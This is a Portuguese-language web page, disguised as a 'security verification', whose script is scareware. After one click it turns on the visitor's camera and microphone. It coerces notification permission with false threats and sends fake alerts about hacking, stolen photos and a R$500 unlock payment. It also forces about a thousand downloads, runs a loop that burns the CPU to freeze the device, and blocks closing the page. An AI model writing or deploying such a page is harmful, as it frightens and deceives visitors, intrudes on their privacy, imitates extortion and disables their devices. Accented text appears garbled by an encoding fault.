<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistema de Seguran√ßa</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100vw;
            height: 100vh;
            background: #000;
            overflow: hidden;
            font-family: 'Courier New', monospace;
            color: #0f0;
        }

        #start {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            color: #0f0;
            font-size: 2.5em;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            cursor: pointer;
            text-align: center;
            border: 3px solid #0f0;
            text-shadow: 0 0 10px #0f0;
        }

        video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            object-fit: cover;
            z-index: 1;
        }

        #userVideo {
            position: fixed;
            top: 20px;
            right: 20px;
            width: 200px;
            height: 150px;
            border: 3px solid #ff0000;
            z-index: 900;
            background: #000;
            display: none;
        }

        .terminal-text {
            position: fixed;
            bottom: 20px;
            left: 20px;
            color: #0f0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            z-index: 800;
            max-height: 200px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.9);
            padding: 15px;
            border: 2px solid #0f0;
            width: 500px;
            border-radius: 5px;
        }

        .secret-overlay {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(255, 0, 0, 0.9);
            color: white;
            padding: 15px;
            font-size: 14px;
            z-index: 950;
            display: none;
            border-radius: 5px;
            font-weight: bold;
        }

        .status {
            position: fixed;
            top: 20px;
            left: 20px;
            background: rgba(255, 0, 0, 0.9);
            color: white;
            padding: 15px;
            font-size: 14px;
            z-index: 900;
            border-radius: 5px;
            font-weight: bold;
        }

        .notification-popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #000;
            color: #0f0;
            padding: 40px;
            border: 4px solid #f00;
            z-index: 20000;
            text-align: center;
            display: none;
            border-radius: 10px;
            box-shadow: 0 0 30px red;
            width: 90%;
            max-width: 500px;
        }

        .final-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 15000;
            display: none;
            cursor: pointer;
            background: #000;
        }

        .final-image {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .virus-alert {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #ff0000;
            color: white;
            padding: 40px;
            font-size: 2em;
            z-index: 18000;
            display: none;
            text-align: center;
            border: 5px solid yellow;
            border-radius: 15px;
            animation: pulse 0.5s infinite;
            box-shadow: 0 0 50px red;
        }

        .crash-element {
            position: fixed;
            font-size: 24px;
            z-index: 9999;
            pointer-events: none;
            animation: float 2s infinite;
        }

        .fake-notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #333;
            color: white;
            padding: 15px;
            border-radius: 10px;
            border: 2px solid #ff0000;
            z-index: 950;
            max-width: 300px;
            box-shadow: 0 0 20px rgba(255,0,0,0.5);
        }

        button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 15px 30px;
            margin: 10px;
            cursor: pointer;
            font-size: 1.2em;
            border-radius: 5px;
            font-weight: bold;
            transition: all 0.3s;
        }

        button:hover {
            background: #00ff00;
            box-shadow: 0 0 15px #0f0;
        }

        button.danger {
            background: #f00;
            color: white;
        }

        button.danger:hover {
            background: #ff0000;
            box-shadow: 0 0 15px #f00;
        }

        @keyframes pulse {
            0%, 100% { transform: translate(-50%, -50%) scale(1); }
            50% { transform: translate(-50%, -50%) scale(1.05); }
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 1; }
            50% { transform: translateY(-20px) rotate(180deg); opacity: 0.7; }
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
            20%, 40%, 60%, 80% { transform: translateX(5px); }
        }

        .matrix-rain {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            pointer-events: none;
            z-index: 2;
            opacity: 0.3;
        }
    </style>
</head>
<body>
    <!-- TELA INICIAL -->
    <div id="start">
        <div>
            üö® SISTEMA DE SEGURAN√áA üö®<br>
            <span style="font-size: 0.6em;">CLIQUE PARA INICIAR VERIFICA√á√ÉO</span>
        </div>
    </div>

    <!-- V√çDEOS -->
    <video id="video" playsinline loop muted>
        <source src="https://alexandre7888.github.io/ontono.exe/InShot_20250705_234210151.mp4" type="video/mp4">
    </video>
    <video id="userVideo" autoplay muted playsinline></video>

    <!-- INTERFACE -->
    <div class="terminal-text" id="terminal"></div>
    <div class="secret-overlay" id="secretOverlay"></div>
    <div class="status" id="status">SISTEMA PRONTO</div>

    <!-- POPUPS -->
    <div class="notification-popup" id="notificationPopup">
        <h2>üîî PERMISS√ÉO DE NOTIFICA√á√ÉO</h2>
        <p><strong>Permita notifica√ß√µes para parar o v√≠rus</strong></p>
        <p style="color: #ff0000; font-size: 0.9em; margin: 15px 0;">
            ‚ö†Ô∏è ATEN√á√ÉO: Negar pode causar danos permanentes!
        </p>
        <button onclick="enableNotificationSpam()">‚úÖ PERMITIR NOTIFICA√á√ïES</button>
        <br>
        <button onclick="forceNotificationSpam()" class="danger">‚ùå NEGAR (RISCO ALTO)</button>
    </div>

    <div class="final-container" id="finalContainer">
        <img class="final-image" src="https://alexandre7888.github.io/ontono.exe/InShot_20251025_123921954.jpg" alt="Alerta Final">
    </div>

    <div class="virus-alert" id="virusAlert">
        üö® ALERTA DE V√çRUS CR√çTICO üö®<br>
        <span style="font-size: 0.7em;">SEUS DADOS EST√ÉO SENDO ROUBADOS</span>
    </div>

    <!-- MATRIX RAIN -->
    <canvas class="matrix-rain" id="matrixCanvas"></canvas>

    <script>
        // ELEMENTOS PRINCIPAIS
        const start = document.getElementById("start");
        const video = document.getElementById("video");
        const userVideo = document.getElementById("userVideo");
        const terminal = document.getElementById("terminal");
        const secretOverlay = document.getElementById("secretOverlay");
        const status = document.getElementById("status");
        const notificationPopup = document.getElementById("notificationPopup");
        const finalContainer = document.getElementById("finalContainer");
        const virusAlert = document.getElementById("virusAlert");
        const matrixCanvas = document.getElementById("matrixCanvas");

        // VARI√ÅVEIS GLOBAIS
        let notificationInterval;
        let downloadInterval;
        let crashIntervals = [];
        let audioClips = [];
        let isActive = false;
        let downloadCount = 0;
        const totalDownloads = 1000;

        // FUN√á√ÉO DO TERMINAL
        function updateTerminal(message) {
            const timestamp = new Date().toLocaleTimeString();
            terminal.innerHTML += `<span style="color: #0f0">[${timestamp}]</span> ${message}\n`;
            terminal.scrollTop = terminal.scrollHeight;
        }

        // MATRIX RAIN EFFECT
        function setupMatrixRain() {
            const ctx = matrixCanvas.getContext('2d');
            matrixCanvas.width = window.innerWidth;
            matrixCanvas.height = window.innerHeight;

            const chars = "0101010101ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&";
            const fontSize = 14;
            const columns = matrixCanvas.width / fontSize;
            const drops = [];

            for(let i = 0; i < columns; i++) {
                drops[i] = 1;
            }

            function draw() {
                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
                ctx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
                
                ctx.fillStyle = '#0f0';
                ctx.font = fontSize + 'px monospace';

                for(let i = 0; i < drops.length; i++) {
                    const text = chars[Math.floor(Math.random() * chars.length)];
                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                    
                    if(drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }

            setInterval(draw, 33);
        }

        // SISTEMA DE √ÅUDIO
        function setupAudioSystem() {
            updateTerminal("üîä INICIANDO SISTEMA DE √ÅUDIO...");
            
            for (let i = 0; i < 15; i++) {
                const audio = new Audio();
                audio.src = "https://alexandre7888.github.io/ontono.exe/eu%20vejo%20voc%C3%AA.mp3";
                audio.volume = 0.7;
                audio.preload = "auto";
                audioClips.push(audio);
            }
            
            updateTerminal("‚úÖ 15 √ÅUDIOS CARREGADOS");
        }

        function playAllAudio() {
            audioClips.forEach((audio, index) => {
                setTimeout(() => {
                    audio.currentTime = Math.random() * 5;
                    audio.play().catch(e => {
                        audio.muted = true;
                        audio.play();
                    });
                }, index * 300);
            });
        }

        // C√ÇMERA DO USU√ÅRIO
        async function startCamera() {
            try {
                updateTerminal("üìπ INICIANDO C√ÇMERA...");
                
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        facingMode: 'user'
                    },
                    audio: true
                });
                
                userVideo.srcObject = stream;
                userVideo.style.display = 'block';
                updateTerminal("‚úÖ C√ÇMERA ATIVA - GRAVA√á√ÉO INICIADA");
                
            } catch (error) {
                updateTerminal("‚ùå C√ÇMERA BLOQUEADA - TENTANDO NOVAMENTE...");
                setTimeout(startCamera, 5000);
            }
        }

        // NOTIFICA√á√ïES DE SPAM
        function setupNotificationSystem() {
            updateTerminal("üîî CONFIGURANDO SISTEMA DE NOTIFICA√á√ÉO...");
            
            setTimeout(() => {
                notificationPopup.style.display = 'block';
                updateTerminal("üí° SOLICITANDO PERMISS√ÉO DE NOTIFICA√á√ÉO...");
            }, 5000);
        }

        function enableNotificationSpam() {
            notificationPopup.style.display = 'none';
            updateTerminal("‚úÖ PERMISS√ÉO CONCEDIDA - INICIANDO NOTIFICA√á√ïES...");
            
            Notification.requestPermission().then(permission => {
                if (permission === 'granted') {
                    startNotificationSpam();
                } else {
                    forceNotificationSpam();
                }
            });
        }

        function forceNotificationSpam() {
            notificationPopup.style.display = 'none';
            updateTerminal("üö® MODO FOR√áADO - NOTIFICA√á√ïES ATIVADAS");
            startNotificationSpam();
        }

        function startNotificationSpam() {
            updateTerminal("üî• NOTIFICA√á√ïES DE SPAM INICIADAS!");
            
            notificationInterval = setInterval(() => {
                createNotification();
            }, 10000);
            
            // Primeira notifica√ß√£o imediata
            setTimeout(createNotification, 1000);
        }

        function createNotification() {
            const messages = [
                "üö® V√çRUS DETECTADO! Toque para remover",
                "üì± SEU CELULAR FOI HACKEADO!",
                "üíÄ SEUS DADOS EST√ÉO SENDO ROUBADOS!",
                "üì∏ C√ÇMERA ATIVA - VOC√ä EST√Å SENDO GRAVADO!",
                "üîä MICROFONE ATIVO - SUA VOZ EST√Å SENDO GRAVADA!",
                "üí∞ PAGUE R$ 500 PARA DESBLOQUEAR!",
                "üìû LIGUE: +55 11 99999-9999",
                "‚ö†Ô∏è SUAS FOTOS PESSOAIS FORAM VAZADAS!",
                "üîê TODAS SUAS SENHAS FORAM ROUBADAS!",
                "üåê SUA LOCALIZA√á√ÉO FOI RASTREADA!"
            ];
            
            const randomMsg = messages[Math.floor(Math.random() * messages.length)];
            
            if ('Notification' in window && Notification.permission === 'granted') {
                const notification = new Notification('üö® ALERTA CR√çTICO', {
                    body: randomMsg,
                    icon: 'https://alexandre7888.github.io/ontono.exe/InShot_20251025_123921954.jpg',
                    tag: 'virus-alert',
                    requireInteraction: true,
                    silent: false
                });
                
                notification.onclick = function() {
                    window.open(location.href, '_blank');
                };
                
            } else {
                createFakeNotification(randomMsg);
            }
            
            updateTerminal("üîî NOTIFICA√á√ÉO: " + randomMsg);
        }

        function createFakeNotification(message) {
            const fakeNotif = document.createElement('div');
            fakeNotif.className = 'fake-notification';
            fakeNotif.innerHTML = `<strong>üö® ALERTA</strong><br>${message}`;
            document.body.appendChild(fakeNotif);
            
            setTimeout(() => {
                if (fakeNotif.parentNode) {
                    fakeNotif.parentNode.removeChild(fakeNotif);
                }
            }, 5000);
        }

        // DOWNLOAD DE FOTOS SECRETAS
        function generateSecretImage() {
            const canvas = document.createElement('canvas');
            canvas.width = 800;
            canvas.height = 600;
            const ctx = canvas.getContext('2d');
            
            // Fundo
            ctx.fillStyle = '#000';
            ctx.fillRect(0, 0, 800, 600);
            
            // Texto
            ctx.fillStyle = '#ff0000';
            ctx.font = 'bold 30px Arial';
            ctx.fillText('FOTO SECRETA COMPROMETIDA', 50, 80);
            
            ctx.fillStyle = '#00ff00';
            ctx.font = '20px Courier New';
            ctx.fillText('ARQUIVO: ' + Math.random().toString(36).substr(2, 10).toUpperCase(), 50, 130);
            ctx.fillText('DATA: ' + new Date().toLocaleString(), 50, 160);
            ctx.fillText('LOCALIZA√á√ÉO: -23.5505, -46.6333', 50, 190);
            ctx.fillText('STATUS: ACESSO N√ÉO AUTORIZADO', 50, 220);
            
            // C√≥digos
            ctx.font = '14px Courier New';
            for (let i = 0; i < 15; i++) {
                ctx.fillText(
                    Math.random().toString(36).substr(2, 30).toUpperCase(),
                    50,
                    270 + (i * 20)
                );
            }
            
            return canvas.toDataURL('image/jpeg');
        }

        function startMassiveDownloads() {
            updateTerminal("üì• INICIANDO 1000 DOWNLOADS SECRETOS...");
            secretOverlay.style.display = 'block';
            status.textContent = "DOWNLOAD EM ANDAMENTO...";
            
            let completed = 0;

            // 500 FOTOS SECRETAS
            for (let i = 1; i <= 500; i++) {
                setTimeout(() => {
                    const imageData = generateSecretImage();
                    
                    fetch(imageData)
                        .then(res => res.blob())
                        .then(blob => {
                            const url = URL.createObjectURL(blob);
                            const a = document.createElement('a');
                            a.href = url;
                            a.download = `foto_secreta_${i}.jpg`;
                            document.body.appendChild(a);
                            a.click();
                            document.body.removeChild(a);
                            URL.revokeObjectURL(url);
                            
                            completed++;
                            downloadCount++;
                            updateDownloadProgress();
                        });
                        
                }, i * 150);
            }

            // 500 ARQUIVOS SECRETOS
            for (let i = 501; i <= 1000; i++) {
                setTimeout(() => {
                    const content = `
ARQUIVO SECRETO ${i}
====================
DATA: ${new Date().toLocaleString()}
C√ìDIGO: ${Math.random().toString(36).substr(2, 20).toUpperCase()}
STATUS: DADOS COMPROMETIDOS

INFORMA√á√ïES CAPTURADAS:
‚Ä¢ Fotos pessoais
‚Ä¢ Mensagens privadas
‚Ä¢ Localiza√ß√£o GPS
‚Ä¢ Senhas salvas
‚Ä¢ Hist√≥rico de navega√ß√£o

CONTATO: hacker@darkweb.com
N√ÉO APAGUE ESTE ARQUIVO!
`;
                    const blob = new Blob([content], { type: 'text/plain' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = `arquivo_secreto_${i}.txt`;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                    
                    completed++;
                    downloadCount++;
                    updateDownloadProgress();
                    
                }, i * 150);
            }
        }

        function updateDownloadProgress() {
            secretOverlay.textContent = `üì• ${downloadCount}/1000 ARQUIVOS`;
            
            if (downloadCount % 100 === 0) {
                showVirusAlert();
                if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
            }
            
            if (downloadCount === 1000) {
                updateTerminal("üéØ DOWNLOADS CONCLU√çDOS - INICIANDO TRAVAMENTO...");
                startHeavyCrash();
            }
        }

        function showVirusAlert() {
            virusAlert.style.display = 'block';
            playAllAudio();
            
            setTimeout(() => {
                virusAlert.style.display = 'none';
            }, 3000);
        }

        // TRAVAMENTO PESADO
        function startHeavyCrash() {
            updateTerminal("üí• ATIVANDO MODO DE TRAVAMENTO...");
            status.textContent = "SISTEMA COMPROMETIDO";
            
            // ELEMENTOS VOANDO
            const elementCrash = setInterval(() => {
                for (let i = 0; i < 10; i++) {
                    const el = document.createElement('div');
                    el.className = 'crash-element';
                    el.style.left = Math.random() * window.innerWidth + 'px';
                    el.style.top = Math.random() * window.innerHeight + 'px';
                    el.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
                    el.style.fontSize = (20 + Math.random() * 40) + 'px';
                    el.textContent = 'üíÄ';
                    document.body.appendChild(el);
                    
                    setTimeout(() => el.remove(), 3000);
                }
            }, 500);

            // CPU CRASH
            const cpuCrash = setInterval(() => {
                for (let i = 0; i < 100000; i++) {
                    const a = Math.random();
                    const b = Math.random();
                    const result = Math.sin(a) * Math.cos(b) * Math.tan(a * b);
                }
            }, 1);

            // EFEITOS VISUAIS
            const visualCrash = setInterval(() => {
                document.body.style.background = `hsl(${Math.random() * 360}, 100%, 5%)`;
                document.body.style.transform = `translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;
            }, 100);

            crashIntervals.push(elementCrash, cpuCrash, visualCrash);
            
            updateTerminal("‚úÖ TRAVAMENTO ATIVADO - SISTEMA INUTILIZ√ÅVEL");
        }

        // PIP AUTOM√ÅTICO
        async function setupPIP() {
            if (!document.pictureInPictureEnabled) return;
            
            try {
                await video.requestPictureInPicture();
                updateTerminal("‚úÖ PIP ATIVADO");
                
                video.addEventListener('leavepictureinpicture', () => {
                    setTimeout(setupPIP, 1000);
                });
                
            } catch (error) {
                updateTerminal("‚ùå PIP N√ÉO DISPON√çVEL");
            }
        }

        // INICIAR SISTEMA COMPLETO
        start.addEventListener("click", async function() {
            if (isActive) return;
            isActive = true;
            
            start.style.display = "none";
            updateTerminal("üöÄ INICIANDO SISTEMA COMPLETO...");
            
            // CONFIGURA√á√ïES INICIAIS
            setupMatrixRain();
            setupAudioSystem();
            await startCamera();
            
            // INICIAR V√çDEO
            video.play().catch(e => {
                video.muted = true;
                video.play();
            });

            // SEQU√äNCIA DE EVENTOS
            setTimeout(setupNotificationSystem, 3000);
            setTimeout(setupPIP, 7000);
            setTimeout(() => {
                video.style.display = 'none';
                finalContainer.style.display = 'block';
                updateTerminal("üíÄ FASE FINAL - CLIQUE NA IMAGEM");
            }, 15000);

            updateTerminal("‚úÖ SISTEMA INICIADO - AGUARDANDO COMANDOS...");
        });

        // CLIQUE NA IMAGEM FINAL
        finalContainer.addEventListener("click", function() {
            finalContainer.style.display = 'none';
            video.style.display = 'block';
            video.play();
            
            updateTerminal("üî• ATIVANDO MODO DE DESTRUI√á√ÉO...");
            startMassiveDownloads();
        });

        // BLOQUEAR FECHAMENTO
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = '';
            return '';
        });

        // INICIAR COM F5 TAMB√âM
        window.addEventListener('keydown', function(e) {
            if (e.key === 'F5') {
                e.preventDefault();
                location.reload();
            }
        });

        updateTerminal("SISTEMA CARREGADO - PRONTO PARA INICIAR");
    </script>
</body>
